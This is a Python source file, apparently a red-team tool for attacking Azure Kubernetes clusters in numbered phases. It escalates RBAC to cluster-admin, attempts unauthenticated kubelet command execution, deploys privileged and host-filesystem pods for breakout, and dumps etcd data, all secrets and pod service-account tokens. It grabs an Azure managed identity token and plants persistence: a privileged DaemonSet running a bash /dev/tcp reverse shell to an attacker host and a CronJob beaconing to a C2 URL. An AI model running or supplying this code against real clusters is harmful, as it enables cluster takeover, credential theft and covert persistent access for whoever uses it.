import os
import re
import socket
import time
import subprocess
from pathlib import Path
from utils import (
    C, run, yaml_apply, yaml_delete, print_header, print_good, print_warn, print_fail
)

results = {}

def phase_prep():
    C.rule("[bold cyan]0 - Preparation & Context")
    ctx = run("kubectl config current-context")
    C.print(f"Using kubeconfig context: [bold]{ctx}")
    results["context"] = ctx

def phase_recon():
    C.rule("[bold cyan]1 - Cluster Reconnaissance")
    cmds = [
        "kubectl version",
        "kubectl get ns",
        "kubectl get nodes -o wide",
        "kubectl get pods -A -o wide",
        "kubectl get svc -A",
        "kubectl get ingress -A || true",
        "kubectl auth can-i --list",
        "kubectl get roles,rolebindings,clusterroles,clusterrolebindings -A",
    ]
    outputs = {}
    for c in cmds:
        out = run(c)
        outputs[c] = out
    results["recon_outputs"] = outputs
    return outputs

def phase_misconfig_dynamic(recon_outputs, c2_beacon_url):
    C.rule("[bold magenta]2 - API-Server / RBAC Misconfig & Abuse")
    run("kubectl create clusterrolebinding ra-pwn --clusterrole=cluster-admin --user=$(whoami) || true")
    imp = run("kubectl auth can-i impersonate sa/default")
    C.print(f"Impersonate SA/default: {imp}")

    can_create_rb = False
    can_patch_rb = False
    can_create_crb = False
    can_patch_crb = False

    can_i_out = recon_outputs.get("kubectl auth can-i --list", "")
    if re.search(r"create.*rolebinding", can_i_out, re.I): can_create_rb = True
    if re.search(r"patch.*rolebinding", can_i_out, re.I): can_patch_rb = True
    if re.search(r"create.*clusterrolebinding", can_i_out, re.I): can_create_crb = True
    if re.search(r"patch.*clusterrolebinding", can_i_out, re.I): can_patch_crb = True

    C.print(f"Can create RoleBinding: {can_create_rb}")
    C.print(f"Can patch RoleBinding: {can_patch_rb}")
    C.print(f"Can create ClusterRoleBinding: {can_create_crb}")
    C.print(f"Can patch ClusterRoleBinding: {can_patch_crb}")

    if can_create_rb:
        C.print("[yellow]Attempting to create RoleBinding escalating to cluster-admin...")
        run("kubectl create rolebinding ra-escalate --clusterrole=cluster-admin --user=$(whoami) --namespace=default || true")
    if can_patch_rb:
        C.print("[yellow]Attempting to patch RoleBinding ra-escalate to cluster-admin...")
        run("kubectl patch rolebinding ra-escalate -p '{\"roleRef\":{\"apiGroup\":\"rbac.authorization.k8s.io\",\"kind\":\"ClusterRole\",\"name\":\"cluster-admin\"}}' -n default || true")
    if can_create_crb:
        C.print("[yellow]Attempting to create ClusterRoleBinding escalating to cluster-admin...")
        run("kubectl create clusterrolebinding ra-escalate --clusterrole=cluster-admin --user=$(whoami) || true")
    if can_patch_crb:
        C.print("[yellow]Attempting to patch ClusterRoleBinding ra-escalate to cluster-admin...")
        run("kubectl patch clusterrolebinding ra-escalate -p '{\"roleRef\":{\"apiGroup\":\"rbac.authorization.k8s.io\",\"kind\":\"ClusterRole\",\"name\":\"cluster-admin\"}}' || true")

    if can_create_rb or can_create_crb:
        C.print("[yellow]Creating service account and binding cluster-admin...")
        run("kubectl create sa ra-sa || true")
        run("kubectl create clusterrolebinding ra-sa-binding --clusterrole=cluster-admin --serviceaccount=default:ra-sa || true")

    C.print(f"[yellow]Storing C2 beacon URL in ConfigMap (if permissions allow)...")
    cm_manifest = f"""
apiVersion: v1
kind: ConfigMap
metadata:
  name: ra-beacon-cm
data:
  beacon_url: "{c2_beacon_url}"
"""
    yaml_apply(cm_manifest)

def phase_kubelet():
    C.rule("[bold magenta]3 - Kubelet Scan & Unauthenticated Exec")
    open_ports = []
    ips_raw = run("kubectl get nodes -o jsonpath='{.items[*].status.addresses[?(@.type==\"InternalIP\")].address}'", silent=True)
    ips = ips_raw.split()
    for ip in ips:
        for port in (10250, 10255):
            s = socket.socket()
            s.settimeout(1)
            try:
                s.connect((ip, port))
                C.print(f"[bright_green]+ Open Kubelet port {ip}:{port}")
                open_ports.append((ip, port))
            except:
                pass
            s.close()
    for ip, port in open_ports:
        if port == 10250:
            out = run(f"curl -sk https://{ip}:10250/run/privileged?cmd=id", silent=True)
            if "uid=" in out:
                C.print(f"[red][!] Unauthenticated exec on {ip} succeeded: {out.strip()}")

def phase_escape():
    C.rule("[bold magenta]4 - Workload Privilege Escapes & Container Breakout")
    yaml_priv = """
apiVersion: v1
kind: Pod
metadata:
  name: ra-priv
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: p
    image: alpine
    securityContext:
      privileged: true
    command: ["/bin/sh", "-c", "sleep 3600"]
"""
    yaml_hostpath = """
apiVersion: v1
kind: Pod
metadata:
  name: ra-hostpath
spec:
  containers:
  - name: h
    image: alpine
    command: ["/bin/sh", "-c", "sleep 3600"]
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
"""
    C.print("[yellow]Deploying privileged pod...")
    yaml_apply(yaml_priv)
    C.print("[yellow]Deploying hostPath pod for host filesystem access...")
    yaml_apply(yaml_hostpath)

def phase_etcd():
    C.rule("[bold magenta]5 - etcd Extraction & Key Dump")
    pod = run("kubectl -n kube-system get po -l component=etcd -o jsonpath='{.items[0].metadata.name}'", silent=True)
    if pod:
        pf = subprocess.Popen(f"kubectl -n kube-system port-forward {pod} 2379:2379", shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        time.sleep(3)
        run("ETCDCTL_API=3 etcdctl --endpoints=localhost:2379 get / --prefix --keys-only | head -n 20")
        pf.terminate()
    else:
        C.print("[yellow]etcd pod not found, skipping etcd dump.")

def phase_secrets():
    C.rule("[bold magenta]6 - Secrets & ServiceAccount Tokens")
    run("kubectl get secrets -A")
    run("kubectl get configmaps -A -o yaml | grep -iE 'password|token|secret' -n || true")
    podlines = run("kubectl get pods -A --no-headers -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name", silent=True).splitlines()
    for l in podlines:
        ns, p = l.split()
        tok = run(f"kubectl -n {ns} exec {p} -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 120", silent=True)
        if tok:
            C.print(f"[yellow]* SA token snippet {ns}/{p}: {tok[:60]}…")

def phase_cloud():
    C.rule("[bold magenta]7 - Azure Cloud Provider IMDS Token")
    try:
        import requests
        r = requests.get(
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            headers={"Metadata": "true"},
            timeout=3,
        )
        if r.ok:
            C.print(f"[red][!] Managed Identity token captured (len={len(r.json()['access_token'])})")
        else:
            C.print("[yellow]Azure IMDS token request failed or no token returned.")
    except Exception as e:
        C.print(f"[yellow]Azure IMDS request error: {e}")

def phase_supply():
    from pathlib import Path
    import re
    C.rule("[bold magenta]8 - Supply Chain & CI/CD Pipeline Files")
    for f in Path.cwd().rglob("*.y*ml"):
        if re.search(r"(pipeline|workflow|gitlab-ci|azure-pipelines)", f.name, re.I):
            C.print(f"[green]• Found pipeline file: {f.relative_to(Path.cwd())}")

def phase_network():
    C.rule("[bold magenta]9 - Network Policies & Lateral Movement Surface")
    run("kubectl get netpol -A || true")
    svc_list = run("kubectl get svc -A -o jsonpath='{range .items[*]}{.metadata.namespace} {.metadata.name} {.spec.ports[0].port} {.spec.clusterIP}\\n{end}'", silent=True)
    for line in svc_list.splitlines():
        if re.search(r"(dashboard|argo|grafana)", line, re.I):
            C.print(f"[yellow]Potential exposed service: {line}")


def phase_persist(lhost, lport, c2_beacon):
    from utils import yaml_apply, run
    import time

    C.rule("[bold magenta]10 - Persistence (DaemonSet, CronJob)")
    rev_shell_cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    ds_yaml = f"""
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: ra-ds
spec:
  selector:
    matchLabels:
      app: ra
  template:
    metadata:
      labels:
        app: ra
    spec:
      hostNetwork: true
      containers:
      - name: rs
        image: ubuntu:latest
        command: ["/bin/bash", "-c", "{rev_shell_cmd}"]
        securityContext:
          privileged: true
          runAsUser: 0
"""
    C.print("[yellow]Deploying DaemonSet for reverse shell persistence...")
    yaml_apply(ds_yaml)

    cron_yaml = f"""
apiVersion: batch/v1
kind: CronJob
metadata:
  name: ra-cj
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: beacon
            image: curlimages/curl
            command: ["/bin/sh", "-c", "curl -s {c2_beacon}"]
          restartPolicy: OnFailure
"""
    C.print("[yellow]Deploying CronJob for persistence beaconing...")
    yaml_apply(cron_yaml)

    # --- REVERSE SHELL STATUS LOGIC ---
    C.print("\n[yellow]Checking DaemonSet pod status in 7 seconds...")
    time.sleep(7)
    pods_output = run("kubectl get pods -A | grep ra-ds", silent=True)
    print_header("DaemonSet pod status:")
    print(pods_output.strip() or "[red]No pods found (check for errors above).")

    if "Running" in pods_output:
        print_good("At least one reverse shell pod is Running!")
        C.print(f"[yellow]Start your listener: [bold green]nc -lvnp {lport}[/bold green]")
        C.print("[yellow]If a shell connects, reverse shell is WORKING! Otherwise, check pod logs for errors.")
    elif "ImagePullBackOff" in pods_output or "ErrImage" in pods_output:
        print_fail("Pods are not starting! Most likely IMAGE problem (check your image and registry).")
    elif "CrashLoopBackOff" in pods_output or "Error" in pods_output:
        print_fail("Pods crashed - the shell command likely failed, or outbound connection was blocked!")
        C.print("[yellow]Fetching pod logs for debugging...")
        # Get pod name
        pod_name = pods_output.split()[1] if pods_output.strip() else None
        if pod_name:
            pod_logs = run(f"kubectl logs {pod_name} -n kube-system", silent=True)
            print_header("Pod Logs")
            print(pod_logs)
    else:
        print_warn("No Running reverse shell pods found (yet). Wait, or check for errors with 'kubectl describe pod'.")

    print_header("Next steps:")
    print_good(f"1. Listen on your attack box: [bold]nc -lvnp {lport}[/bold]")
    print_good("2. Wait for a shell. If you get a shell prompt, REVERSE SHELL IS WORKING.")
    print_good("3. If not, check for egress restrictions, pod status, and logs as shown above.")
    print_good("4. Clean up after test: 'kubectl delete ds ra-ds'")




def phase_exfil():
    from pathlib import Path
    C.rule("[bold magenta]11 - Exfiltration")
    OUT = Path("aks_red_team_output")
    secret_file = OUT / "secrets_dump.yaml"
    etcd_snap = OUT / "etcd_snapshot.snap"
    C.print("[yellow]Dumping all secrets to local file...")
    run(f"kubectl get secrets -A -o yaml > {secret_file}")
    pod = run("kubectl -n kube-system get po -l component=etcd -o jsonpath='{.items[0].metadata.name}'", silent=True)
    if pod:
        C.print("[yellow]Taking etcd snapshot...")
        pf = subprocess.Popen(f"kubectl -n kube-system port-forward {pod} 2379:2379", shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        time.sleep(3)
        run(f"ETCDCTL_API=3 etcdctl snapshot save {etcd_snap} 2>/dev/null || true", silent=True)
        pf.terminate()
        C.print(f"[green]Etcd snapshot saved to {etcd_snap}")
    else:
        C.print("[yellow]Etcd pod not found, skipping snapshot.")

def phase_cleanup():
    C.rule("[bold magenta]12 - Cleanup")
    resources = [
        ("clusterrolebinding", "ra-pwn"),
        ("rolebinding", "ra-escalate"),
        ("clusterrolebinding", "ra-escalate"),
        ("serviceaccount", "ra-sa"),
        ("clusterrolebinding", "ra-sa-binding"),
        ("pod", "ra-priv"),
        ("pod", "ra-hostpath"),
        ("daemonset", "ra-ds"),
        ("cronjob", "ra-cj"),
        ("configmap", "ra-beacon-cm"),
    ]
    for kind, name in resources:
        C.print(f"[yellow]Deleting {kind} {name}...")
        yaml_delete(kind, name)

# --- EXTENDED PHASES: admission, aggregation, quotas, service-mesh, event-logs, dashboard, prometheus, runtime-abuse, lateral-move, cloud-priv-escalation ---
# Copy/paste their logic from your extended enumeration above, or from the Red Assault code.

